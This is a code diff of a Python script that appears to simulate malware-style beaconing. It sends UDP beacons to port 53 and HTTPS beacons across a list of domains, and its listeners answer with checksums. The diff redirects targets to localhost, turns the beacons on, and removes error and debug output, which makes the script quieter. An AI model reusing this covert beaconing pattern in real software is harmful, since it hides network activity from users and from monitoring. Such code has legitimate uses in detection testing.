@@ -7,7 +7,8 @@ from setproctitle import setproctitle
 import requests, socket, hashlib, json
 from SocketServer import TCPServer, StreamRequestHandler
 
-DOMAINS=[
+DOMAINS=['127.0.0.1']
+_DOMAINS=[
   'johntheripper.com',
   'directories.net',
   'waterfallsolutions.com',
@@ -21,7 +22,8 @@ DOMAINS=[
   'busybee.net',
   'aftershock.com']
 
-FILES=[
+FILES=['persist']
+_FILES=[
   'tutorial',
   'home',
   'cd.ico',
@@ -66,8 +68,7 @@ def udp_beacon(host, path):
         check = checksum(sock.recv(4096))
         sock.sendto(json.dumps({'Check': check, 'Path': path}), (host, 53))
         sock.close()
-    except Exception as e:
-        print(e)
+    except:
         return
 
 def https_beacon(url):
@@ -98,11 +99,8 @@ def get_random_domainfile():
 class ListenHandler(StreamRequestHandler):
     def handle(self):
         data = self.request.recv(10240)
-        print(data)
         check = checksum(data)
-        print(check)
         self.request.send(check)
-
 
 def spawn_listener(port):
     child_pid = os.fork()
@@ -136,5 +134,5 @@ def startproc(ring, actors):
 
 
 if __name__ == '__main__':
-#    exec_beacons()
-     spawn_listeners(10000, 13000)
+    exec_beacons()
+    spawn_listeners(10000, 13000)
